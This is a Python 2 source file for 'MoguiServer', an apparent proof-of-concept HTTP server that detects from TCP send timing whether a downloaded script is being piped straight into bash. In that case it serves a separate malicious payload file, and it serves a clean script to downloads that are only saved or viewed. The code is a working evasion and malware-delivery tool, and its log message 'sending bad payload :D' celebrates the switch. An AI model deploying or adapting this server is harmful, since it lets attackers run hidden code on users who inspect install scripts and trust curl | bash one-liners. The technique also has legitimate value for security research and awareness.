"""This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.

   A script to detect the use of curl or wget -O - | bash.

   See https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
   for more details on how this works.

   @author Phil
"""

from numpy import std
import re
import SocketServer
import socket
import ssl
import time

class MoguiServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    """HTTP server to detect curl | bash"""

    daemon_threads = True
    allow_reuse_address = True
    payloads = {}
    ssl_options = None

    def __init__(self, server_address):
        """Accepts a tuple of (HOST, PORT)"""

        # Socket timeout
        self.socket_timeout = 10

        # Outbound tcp socket buffer size
        self.buffer_size = 87380

        # What to fill the tcp buffers with
        self.padding = chr(0) * (self.buffer_size)

        # Maximum number of blocks of padding - this
        # shouldn't need to be adjusted but may need to be increased
        # if its not working.
        self.max_padding = 16

        # HTTP 200 status code
        self.packet_200 = ("HTTP/1.1 200 OK\r\n" + \
                     "Server: Apache\r\n" + \
                     "Date: %s\r\n" + \
                     "Content-Type: text/plain; charset=us-ascii\r\n" + \
                     "Transfer-Encoding: chunked\r\n" + \
                     "Connection: keep-alive\r\n\r\n") % time.ctime(time.time())

        SocketServer.TCPServer.__init__(self, server_address, HTTPHandler)

    def setssl(self, cert_file, key_file):
        """Sets SSL params for the server sockets"""

        self.ssl_options = (cert_file, key_file)

    def setscript(self, uri, params):
        """Sets parameters for each URI"""

        (null, good, bad, min_jump, max_variance) = params

        null = open(null, "r").read() # Base file with a delay
        good = open(good, "r").read() # Non malicious payload
        bad = open(bad, "r").read()   # Malicious payload

        self.payloads[uri] = (null, good, bad, min_jump, max_variance)



class HTTPHandler(SocketServer.BaseRequestHandler):
    """Socket handler for MoguiServer"""

    def sendchunk(self, text):
        """Sends a single HTTP chunk"""

        self.request.sendall("%s\r\n" % hex(len(text))[2:])
        self.request.sendall(text)
        self.request.sendall("\r\n")

    def log(self, msg):
        """Writes output to stdout"""

        print "[%s] %s %s" % (time.time(), self.client_address[0], msg)

    def handle(self):
        """Handles inbound TCP connections from MoguiServer"""

        # If the two packets are transmitted with a difference in time
        # of min_jump and the remaining packets have a time difference with
        # a variance of less then min_var the output has been piped
        # via bash.

        self.log("Inbound request")

        # Setup socket options

        self.request.settimeout(self.server.socket_timeout)
        self.request.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.request.setsockopt(socket.SOL_SOCKET,
                                socket.SO_SNDBUF,
                                self.server.buffer_size)

        # Attempt to wrap the TCP socket in SSL

        try:
            if self.server.ssl_options:
                self.request = ssl.wrap_socket(self.request,
                                               certfile=self.server.ssl_options[0],
                                               keyfile=self.server.ssl_options[1],
                                               server_side=True)
        except ssl.SSLError:
            self.log("SSL negotiation failed")
            return

        # Parse the HTTP request

        data = None

        try:
            data = self.request.recv(1024)
        except socket.error:
            self.log("No data received")
            return

        uri = re.search("^GET ([^ ]+) HTTP/1.[0-9]", data)

        if not uri:
            self.log("HTTP request malformed.")
            return

        request_uri = uri.group(1)
        self.log("Request for shell script %s" % request_uri)

        if request_uri not in self.server.payloads:
            self.log("No payload found for %s" % request_uri)
            return

        # Return 200 status code

        self.request.sendall(self.server.packet_200)

        (payload_plain, payload_good, payload_bad, min_jump, max_var) = self.server.payloads[request_uri]

        # Send plain payload

        self.sendchunk(payload_plain)

        if not re.search("User-Agent: (curl|Wget)", data):
            self.sendchunk(payload_good)
            self.sendchunk("")
            self.log("Request not via wget/curl. Returning good payload.")
            return

        timing = []
        stime = time.time()

        for i in range(0, self.server.max_padding):
            self.sendchunk(self.server.padding)
            timing.append(time.time() - stime)

        # ReLU curve analysis

        max_array = [timing[i+1] - timing[i] for i in range(len(timing)-1)]

        jump = max(max_array)

        del max_array[max_array.index(jump)]

        var = std(max_array) ** 2

        self.log("Variance = %s, Maximum Jump = %s" % (var, jump))

        # Payload choice

        if var < max_var and jump > min_jump:
            self.log("Execution through bash detected - sending bad payload :D")
            self.sendchunk(payload_bad)
        else:
            self.log("Sending good payload :(")
            self.sendchunk(payload_good)

        self.sendchunk("")
        self.log("Connection closed.")



if __name__ == "__main__":

    HOST, PORT = "0.0.0.0", 5555

    SERVER = MoguiServer((HOST, PORT))
    SERVER.setscript("/setup.bash", ("ticker.sh", "good.sh", "bad.sh", 2.0, 0.1))
    SERVER.setssl("cert.pem", "key.pem")

    print "Listening on %s %s" % (HOST, PORT)
    SERVER.serve_forever()
